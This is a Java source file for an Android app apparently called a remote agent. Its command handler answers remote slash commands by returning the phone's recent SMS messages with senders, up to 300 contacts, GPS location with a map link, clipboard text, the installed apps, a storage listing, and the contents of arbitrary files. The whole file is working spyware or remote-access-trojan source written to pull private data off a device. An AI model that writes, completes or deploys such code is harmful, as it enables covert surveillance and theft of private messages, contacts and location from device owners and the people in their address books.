package com.zynremote.agent;

import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.location.Location;
import android.location.LocationManager;
import android.media.projection.MediaProjectionManager;
import android.net.Uri;
import android.os.Environment;
import android.provider.ContactsContract;
import android.provider.Telephony;
import android.telephony.TelephonyManager;
import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.InputStreamReader;
import java.io.FileReader;
import java.util.ArrayList;
import java.util.List;

public class Commands {

    public static String execute(Context ctx, String cmd) {
        try {
            if (cmd.equals("/ping")) return "pong";
            if (cmd.equals("/info")) return DeviceInfo.getInfoJson(ctx);
            if (cmd.equals("/apps")) return getApps(ctx);
            if (cmd.equals("/sms")) return getSms(ctx);
            if (cmd.equals("/contacts")) return getContacts(ctx);
            if (cmd.equals("/location")) return getLocation(ctx);
            if (cmd.equals("/files")) return getFiles();
            if (cmd.equals("/clip")) return getClipboard(ctx);
            if (cmd.startsWith("/get ")) return getFile(cmd.substring(5).trim());
            return "unknown command: " + cmd;
        } catch (Throwable t) {
            return "error: " + t.getMessage();
        }
    }

    private static String getApps(Context ctx) {
        try {
            android.content.pm.PackageManager pm = ctx.getPackageManager();
            List<android.content.pm.ApplicationInfo> apps =
                pm.getInstalledApplications(0);
            StringBuilder sb = new StringBuilder();
            sb.append("Всего: ").append(apps.size()).append("\n\n");
            for (android.content.pm.ApplicationInfo ai : apps) {
                boolean sys = (ai.flags & android.content.pm.ApplicationInfo.FLAG_SYSTEM) != 0;
                String name = pm.getApplicationLabel(ai).toString();
                sb.append(sys ? "[SYS] " : "[USR] ")
                  .append(name).append(" -> ").append(ai.packageName).append("\n");
            }
            return sb.toString();
        } catch (Throwable t) {
            return "error apps: " + t.getMessage();
        }
    }

    private static String getSms(Context ctx) {
        try {
            Cursor c = ctx.getContentResolver().query(
                Telephony.Sms.CONTENT_URI, null, null, null,
                Telephony.Sms.DATE + " DESC LIMIT 30");
            if (c == null) return "no access";
            StringBuilder sb = new StringBuilder();
            sb.append("Последние SMS:\n\n");
            int count = 0;
            while (c.moveToNext() && count < 30) {
                String addr = c.getString(c.getColumnIndexOrThrow(Telephony.Sms.ADDRESS));
                String body = c.getString(c.getColumnIndexOrThrow(Telephony.Sms.BODY));
                long date = c.getLong(c.getColumnIndexOrThrow(Telephony.Sms.DATE));
                sb.append("[").append(new java.util.Date(date)).append("]\n");
                sb.append("From: ").append(addr).append("\n");
                sb.append(body).append("\n---\n");
                count++;
            }
            c.close();
            return sb.toString();
        } catch (Throwable t) {
            return "error sms: " + t.getMessage();
        }
    }

    private static String getContacts(Context ctx) {
        try {
            Cursor c = ctx.getContentResolver().query(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                null, null, null, null);
            if (c == null) return "no access";
            StringBuilder sb = new StringBuilder();
            sb.append("Контакты:\n\n");
            int count = 0;
            while (c.moveToNext() && count < 300) {
                String name = c.getString(c.getColumnIndexOrThrow(
                    ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                String phone = c.getString(c.getColumnIndexOrThrow(
                    ContactsContract.CommonDataKinds.Phone.NUMBER));
                sb.append(name).append(" : ").append(phone).append("\n");
                count++;
            }
            c.close();
            sb.insert(0, "Всего: " + count + "\n\n");
            return sb.toString();
        } catch (Throwable t) {
            return "error contacts: " + t.getMessage();
        }
    }

    private static String getLocation(Context ctx) {
        try {
            LocationManager lm = (LocationManager)
                ctx.getSystemService(Context.LOCATION_SERVICE);
            if (lm == null) return "no lm";
            Location loc = null;
            try { loc = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER); }
            catch (Throwable t) {}
            if (loc == null) {
                try { loc = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER); }
                catch (Throwable t) {}
            }
            if (loc == null) return "no location (GPS off or no permission)";
            return "Lat: " + loc.getLatitude() + "\n" +
                   "Lon: " + loc.getLongitude() + "\n" +
                   "Accuracy: " + loc.getAccuracy() + " m\n" +
                   "https://maps.google.com/?q=" + loc.getLatitude() + "," + loc.getLongitude();
        } catch (Throwable t) {
            return "error location: " + t.getMessage();
        }
    }

    private static String getFiles() {
        try {
            File sd = Environment.getExternalStorageDirectory();
            StringBuilder sb = new StringBuilder();
            sb.append("Корень: ").append(sd.getAbsolutePath()).append("\n\n");
            File[] files = sd.listFiles();
            if (files == null) return "no access";
            for (File f : files) {
                sb.append(f.isDirectory() ? "DIR " : "FILE ")
                  .append(f.getName())
                  .append(f.isDirectory() ? "" : " (" + f.length() + " b)")
                  .append("\n");
            }
            return sb.toString();
        } catch (Throwable t) {
            return "error files: " + t.getMessage();
        }
    }

    private static String getClipboard(Context ctx) {
        try {
            android.content.ClipboardManager cm = (android.content.ClipboardManager)
                ctx.getSystemService(Context.CLIPBOARD_SERVICE);
            if (cm == null || !cm.hasPrimaryClip()) return "clipboard empty";
            CharSequence text = cm.getPrimaryClip().getItemAt(0).coerceToText(ctx);
            return text == null ? "empty" : text.toString();
        } catch (Throwable t) {
            return "error clip: " + t.getMessage();
        }
    }

    private static String getFile(String path) {
        try {
            File f = new File(path);
            if (!f.exists() || !f.isFile()) return "not found: " + path;
            if (f.length() > 500 * 1024) return "too big: " + f.length() + " bytes";
            BufferedReader r = new BufferedReader(new FileReader(f));
            StringBuilder sb = new StringBuilder();
            String line;
            while ((line = r.readLine()) != null) sb.append(line).append("\n");
            r.close();
            return sb.toString();
        } catch (Throwable t) {
            return "error get: " + t.getMessage();
        }
    }
}
